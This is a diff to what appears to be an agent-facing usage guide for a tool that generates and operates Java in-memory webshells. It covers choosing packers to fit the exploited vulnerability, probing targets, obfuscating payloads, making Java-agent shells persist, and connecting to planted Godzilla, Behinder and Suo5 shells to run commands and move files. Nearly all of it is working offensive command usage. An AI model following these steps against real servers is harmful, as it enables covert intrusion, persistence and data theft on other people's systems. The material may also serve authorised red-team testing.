@@ -17,7 +17,7 @@ Two equivalent interfaces — pick whichever is available:
 
 - **CLI**: `memparty <command> [flags]` (install: `npm install -g memshell-party-cli`, or `npx memshell-party-cli`).
 - **MCP tools** (if the `memshell-party` MCP server is connected): `list_servers`, `list_config`,
-  `list_packers`, `list_command_configs`, `generate_memshell`, `generate_probe`, `parse_classname`,
+  `list_packers`, `list_command_configs`, `list_shell_tool_configs`, `list_obfuscation_options`, `generate_memshell`, `generate_probe`, `bytecode_decode`, `bytecode_transform`, `parse_classname`,
   `server_version`, `connect_test`, `exec_command`, `download_file`, `upload_file`, `target_save`,
   `target_note`, `target_list`, `target_remove`, `log_list`.
 
@@ -34,6 +34,8 @@ memparty config servers            # every server + its shell types
 memparty config tools Tomcat       # one server's tools + types
 memparty config packers            # packer parent/child tree
 memparty config command            # Command-tool encryptors & implementation classes
+memparty config tool-configs       # v3+ shell-tool fields & enum choices
+memparty config obfuscation       # v3+ obfuscation options
 ```
 
 Add `--json` for machine-readable output. Use the exact strings these return.
@@ -54,10 +56,11 @@ to confirm it's supported. If you only know "it's a Spring Boot app", that's `Sp
 | Tool | Use when |
 |------|----------|
 | `Godzilla` | Godzilla-compatible encrypted webshell (pass + key) |
+| `GodzillaSession` | v3+ session-backed Godzilla-compatible shell (pass + key) |
 | `Behinder` | Behinder ("冰蝎") encrypted webshell (pass) |
 | `AntSword` | AntSword ("蚁剑") webshell (pass) |
 | `Command` | Single command execution / RCE (param name + encryptor) |
-| `Suo5` / `Suo5v2` | SOCKS5 proxy tunnel via Suo5 |
+| `Suo5` | SOCKS5 proxy tunnel (v3 uses the former Suo5v2 protocol) |
 | `NeoreGeorg` | NeoreGeorg tunneling shell |
 | `Proxy` | Generic proxy (often WebSocket-based) |
 | `Custom` | Your own `.class` bytecode (`--shell-class-file` or `--shell-class-base64`) |
@@ -92,10 +95,9 @@ The packer must match the **delivery vector** (the vuln you're exploiting). Pick
 | Whole payload as a runnable JAR | `Jar`, `ScriptEngineJar`, `GroovyTransformJar` |
 | XXL-JOB endpoint | `XxlJob` |
 
-> **Aggregate vs leaf packers:** parent packers like `Base64`, `JSP`, `JavaDeserialize`,
-> `AbstractTranslet`, `ScriptEngine`, `OGNL`, `SpEL`… return *several* variants at once
-> (`allPackResults`). For a single payload, pick a **leaf** (child) packer. Run
-> `memparty config packers` to see the parent→child tree.
+> **Packer categories vs variants:** on v3, parents like `Base64`, `JSP`, `JavaDeserialize`,
+> `AbstractTranslet`, `ScriptEngine`, `OGNL`, `SpEL`… are only categories. Pick a concrete child.
+> Legacy v2 parents can return several variants (`allPackResults`). Run `memparty config packers`.
 
 ## Step 2 — Probe (fingerprint first when unsure)
 
@@ -106,9 +108,12 @@ memshell. Probes have a strict method × content matrix — only these combos wo
 |---------------|---------------------------|-------------|
 | `DNSLog` | `Server`, `JDK` | `--host <dnslog.domain>` |
 | `Sleep` | `Server` only | `--sleep-server <guess> --seconds N` |
-| `ResponseBody` | `Command`, `Bytecode`, `Filter`, `ScriptEngine` | `--server <guess> --req-param-name <p>` (Command also takes `--command-template`) |
+| `ResponseBody`, `ResponseHeader` | `Server`, `Command`, `Bytecode`, `Filter`, `ScriptEngine` | `--server <guess> --req-param-name <p>` (Command also takes `--command-template`) |
 
 > `OS`, `BasicInfo` are enum values but **not usable** through any method — don't use them.
+> `ResponseHeader` is v3+. Optional `--resp-header-name` controls the response header. With
+> `--server Unknown`, the probe identifies the middleware; set `--req-param-name` and send the
+> same name as a request parameter or header to let it find the live request.
 
 ```bash
 # Blind: does the target resolve our DNS? Which server is it?
@@ -130,13 +135,15 @@ memparty gen -s <server> -t <tool> -y <type> -p <packer> [tool-specific flags] [
 ```
 
 Common tool-specific flags:
-- Godzilla: `--godzilla-pass`, `--godzilla-key`
+- Godzilla / GodzillaSession: `--godzilla-pass`, `--godzilla-key`
 - Behinder: `--behinder-pass`
 - AntSword: `--antsword-pass`
 - Command: `--command-param-name`, `--encryptor RAW|BASE64|DOUBLE_BASE64`, `--implementation-class RuntimeExec|ForkAndExec`, `--command-template`
 - All webshell tools: `--header-name` / `--header-value` (auth header the shell checks)
 - Custom: `--shell-class-file path.class` (or `--shell-class-base64`)
 - Injector: `--url-pattern /*`, `--injector-class-name`, `--no-static-initialize`
+- v3+ obfuscation: `--obfuscate`, `--obfuscation-options enableControlFlow=false,...`,
+  `--obfuscation-scope ALL|MEMSHELL_INJECTOR|INJECTOR|MEMSHELL`; probe also accepts the first two.
 
 Output:
 - payload → **stdout** by default.
@@ -149,6 +156,22 @@ Output:
   telling you to pick a leaf packer.
 - MCP: `generate_memshell` / `generate_probe` accept an `outputFile` arg with the same
   behavior (auto-decode by extension, write result echoed back as `outputFile`).
+
+### Agent persistence and bytecode tools
+
+For an Agent shell, `--agent-args persist=true` / `--agent-args restore=true` supplies an
+attach-time argument, not a generation DTO field. It requires an `Agent*` shell type with
+`AgentJar`, `AgentJarWithJDKAttacher`, or
+`AgentJarWithJREAttacher`; `FilelessAgent` is a different delivery mechanism. Use the returned examples:
+`java -jar agent.jar <pid> persist=true` or
+`jattach <pid> load instrument false agent.jar=persist=true`; substitute `restore=true` to
+restore the original jar.
+
+`memparty bytecode decode -f Payload.class` decodes a class. `bytecode transform` accepts
+`--relocate-from/--relocate-to`, `--new-class-name`, `--random-name`, `--entry-method`,
+`--obfuscate`, `--probe-method ResponseBody|ResponseHeader`, `--server`, and `-p <packer>`.
+Use `-o` to write the transformed class, or the packed result when a packer is selected.
+MCP equivalents are `bytecode_decode` / `bytecode_transform`.
 
 ## Step 4 — Verify the shell is alive
 
@@ -163,7 +186,7 @@ memparty connect -u <shell-url> -t suo5                                 # add --
 
 MemShellParty shells check an auth header — take `headerName`/`headerValue` from the
 `gen --json` output (`shellToolConfig`) and pass them along, or every check fails with an empty
-response (the Suo5v2 shell checks it too):
+response (the v3 Suo5 shell checks it too):
 
 ```bash
 memparty connect -u <shell-url> -t godzilla --pass pass --key key \
@@ -172,6 +195,10 @@ memparty connect -u <shell-url> -t godzilla --pass pass --key key \
 
 Over MCP the same check is the `connect_test` tool (`url`, `tool`, `pass`/`key`,
 `headerName`/`headerValue`, `suo5Mode`).
+
+Godzilla WebSocket / RawWebSocket uses a `ws://` or `wss://` URL. Tomcat Upgrade uses HTTP
+plus `--upgrade-protocol <fully-qualified-shell-class-name>`; save it with the target. A
+`GodzillaSession` shell connects with `-t godzilla`, which relays its session cookie.
 
 Self-signed TLS → add `-k/--insecure`; extra headers (cookies etc.) → repeatable
 `-H "Name: value"`. Both flags exist on `exec` too (over MCP: `insecure`, `timeoutMs`).
@@ -470,13 +497,13 @@ actions before repeating them, or to answer "what did we run on this host?".
 
 - **Jakarta vs javax.** Tomcat 10+ / Spring Boot 3 → `Jakarta*` shell types. Tomcat 9- / Spring Boot 2
   → non-prefixed. Picking the wrong family = the shell won't load.
-- **JDK target.** `--jdk java6/8/9/11/17/21` (or bare `8`, or raw major `52`). Match (or stay ≤) the
+- **JDK target.** `--jdk java6/8/9/11/17/21/25` (or bare `8`, or raw major `52`). Match (or stay ≤) the
   target's JDK so the bytecode loads. JDK 9+ auto-enables Java-module bypass unless `--no-bypass-module`.
 - **Spring-gzip packers** (`SpEL`/`OGNL`/`JXPath` + their `*SpringGzip*` / `*JDK17` variants) need a
   special injector class name — the CLI generates one automatically; don't override
   `--injector-class-name` for these.
 - **Shrink is on by default** (smaller bytecode). Use `--no-shrink` only if a stripped payload misbehaves.
-- **Aggregate packers** return multiple variants — pick a leaf for a single payload (see Step 1).
+- **v3 packer parents are categories** — pick a concrete variant (legacy v2 aggregates return multiple variants).
   `-o`/`outputFile` refuses them outright (error tells you to pick a leaf packer).
 - **Agent memshells** (`Agent*` types) require the `AgentJar*` packer family and a JVM attach; they
   aren't class-byte payloads.
